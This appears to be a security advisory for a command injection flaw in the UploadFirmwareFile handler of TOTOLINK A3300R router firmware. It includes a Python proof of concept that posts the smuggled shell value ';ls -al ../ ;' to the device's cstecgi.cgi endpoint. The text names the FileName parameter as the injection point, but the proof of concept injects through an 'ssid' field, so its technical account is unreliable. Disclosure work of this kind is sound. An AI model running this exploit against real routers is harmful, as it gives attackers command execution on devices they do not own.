## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

## Affected version

A3300R V17.0.0cu.557_B20221024

## Vulnerability details

In the A3300R V17.0.0cu.557_B20221024 firmware has a command injection vulnerability in the `UploadFirmwareFile` function. The `v2` variable receives the `FileName` parameter from a POST request. However, since the user can control the input of `FileName`, the statement `doSystem` can cause a command injection vulnerability.

![image-20240722023936258](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240722023936258.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"topicurl":"UploadFirmwareFile","ssid":";ls -al ../ ;"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721213628055](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721213628055.png)
